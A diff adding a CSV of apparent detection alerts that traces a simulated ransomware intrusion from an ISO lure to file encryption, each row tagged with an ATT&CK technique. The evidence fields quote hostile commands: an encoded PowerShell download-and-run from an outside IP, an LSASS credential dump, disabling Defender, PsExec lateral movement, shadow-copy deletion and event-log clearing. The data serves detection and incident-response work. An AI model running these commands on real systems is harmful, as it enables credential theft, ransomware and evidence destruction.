@@ -1,0 +1,27 @@
+time_utc,host,user,tactic,technique,rule,severity,title,evidence
+2026-10-27T14:25:00.000Z,WS-0102.corp.example,CORP\tnguyen,Initial Access,T1553.005,DF-01,high,Disk image (ISO/IMG/VHD) written by browser or mail client,C:\Users\tnguyen\Downloads\Payroll_Nov2026.iso
+2026-10-27T14:26:35.000Z,WS-0102.corp.example,CORP\tnguyen,Execution,T1218.005,DF-02,high,mshta.exe executing HTA / script,"""mshta.exe"" ""E:\Payroll_Nov2026.hta"""
+2026-10-27T14:26:41.000Z,WS-0102.corp.example,CORP\tnguyen,Execution,T1059.001,DF-03,high,Encoded / hidden PowerShell,powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADgALgA1ADEALgAxADAAMAAuADYANgAvAGEAJwApAA==
+2026-10-27T14:26:50.000Z,WS-0102.corp.example,CORP\tnguyen,Execution,T1105,DF-06,medium,Executable/DLL dropped in user-writable path,C:\ProgramData\SysUpdate\upd.dll
+2026-10-27T14:26:55.000Z,WS-0102.corp.example,CORP\tnguyen,Defense Evasion,T1218.011,DF-05,high,rundll32 loading a DLL from a user-writable path,"rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start"
+2026-10-27T14:26:58.000Z,WS-0102.corp.example,,Command and Control,T1071.001,DF-20,critical,"C2 beaconing every ~60.1s (30 connections, jitter 0.04)",C:\Windows\System32\rundll32.exe -> 198.51.100.66:443
+2026-10-27T14:27:20.000Z,WS-0102.corp.example,CORP\tnguyen,Persistence,T1053.005,DF-07,high,Scheduled task created (command line),"schtasks /create /tn ""MicrosoftEdgeUpdateTaskCore"" /tr ""rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start"" /sc onlogon /rl highest"
+2026-10-27T14:27:21.000Z,WS-0102.corp.example,CORP\tnguyen,Persistence,T1053.005,DF-08,high,Scheduled task registered (Event 4698),"rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start"
+2026-10-27T14:35:00.000Z,WS-0102.corp.example,CORP\tnguyen,Discovery,T1087.002,DF-10,medium,Domain / privileged-group discovery commands,"cmd.exe /c whoami /all & net group ""domain admins"" /domain & nltest /dclist:corp.example"
+2026-10-27T14:50:00.000Z,WS-0102.corp.example,NT AUTHORITY\SYSTEM,Credential Access,T1003.001,DF-11,critical,LSASS memory dump (comsvcs MiniDump / procdump),"rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 704 C:\ProgramData\SysUpdate\d.bin full"
+2026-10-27T14:50:00.000Z,WS-0102.corp.example,NT AUTHORITY\SYSTEM,Credential Access,T1003.001,DF-12,critical,Process opened LSASS with full access (Sysmon 10),C:\Windows\System32\lsass.exe
+2026-10-27T14:51:40.000Z,WS-0102.corp.example,NT AUTHORITY\SYSTEM,Defense Evasion,T1562.001,DF-13,critical,Microsoft Defender protection disabled,powershell.exe Set-MpPreference -DisableRealtimeMonitoring $true
+2026-10-27T15:25:00.000Z,WS-0102.corp.example,CORP\svc_backup,Lateral Movement,T1569.002,DF-14,high,PsExec remote execution,PsExec64.exe \\FS01.corp.example -accepteula -s cmd.exe /c C:\Windows\Temp\lk.exe
+2026-10-27T15:25:02.000Z,FS01.corp.example,svc_backup,Lateral Movement,T1021.002,DF-15,medium,Network logon (type 3) from a workstation to a server,EventID 4624
+2026-10-27T15:25:03.000Z,FS01.corp.example,CORP\svc_backup,Persistence,T1543.003,DF-09,medium,New service installed (Event 7045),%SystemRoot%\PSEXESVC.exe
+2026-10-27T15:25:03.000Z,FS01.corp.example,CORP\svc_backup,Lateral Movement,T1569.002,DF-14,high,PsExec remote execution,%SystemRoot%\PSEXESVC.exe
+2026-10-27T15:25:04.000Z,FS01.corp.example,NT AUTHORITY\SYSTEM,Execution,T1569.002,DF-18,high,Process executed from Windows\Temp by a service (SYSTEM),C:\Windows\Temp\lk.exe --path D:\Shares --ext .lockd
+2026-10-27T15:25:06.000Z,FS01.corp.example,NT AUTHORITY\SYSTEM,Impact,T1490,DF-16,critical,"Shadow copies / backup catalog deleted, recovery disabled",vssadmin.exe delete shadows /all /quiet
+2026-10-27T15:25:07.000Z,FS01.corp.example,NT AUTHORITY\SYSTEM,Impact,T1490,DF-16,critical,"Shadow copies / backup catalog deleted, recovery disabled",wbadmin delete catalog -quiet
+2026-10-27T15:25:08.000Z,FS01.corp.example,NT AUTHORITY\SYSTEM,Impact,T1490,DF-16,critical,"Shadow copies / backup catalog deleted, recovery disabled",bcdedit /set {default} recoveryenabled no
+2026-10-27T15:25:10.000Z,FS01.corp.example,,Impact,T1486,DF-21,critical,Mass encryption: 250 files renamed to *.lockd,C:\Windows\Temp\lk.exe (2026-10-27T15:25:10.000Z → 2026-10-27T15:29:19.000Z)
+2026-10-27T15:30:00.000Z,FS01.corp.example,,Impact,T1486,DF-22,critical,Ransom note dropped,D:\Shares\README_RESTORE_FILES.txt
+2026-10-27T15:30:50.000Z,FS01.corp.example,NT AUTHORITY\SYSTEM,Defense Evasion,T1070.001,DF-17,critical,Event log cleared,wevtutil.exe cl Security
+2026-10-27T15:30:51.000Z,FS01.corp.example,NT AUTHORITY\SYSTEM,Defense Evasion,T1070.001,DF-17,critical,Event log cleared,EventID 1102
+2026-10-27T20:10:00Z,WS-0102.corp.example,CORP\tnguyen,Persistence,T1053.005,DF-23,high,Live scheduled task runs from user-writable path (\MicrosoftEdgeUpdateTaskCore),"rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start"
+2026-10-27T20:10:00Z,WS-0102.corp.example,CORP\tnguyen,Command and Control,T1071,DF-24,critical,Active connection to internet from suspicious process at collection time,"rundll32.exe C:\ProgramData\SysUpdate\upd.dll,Start -> 198.51.100.66:443"
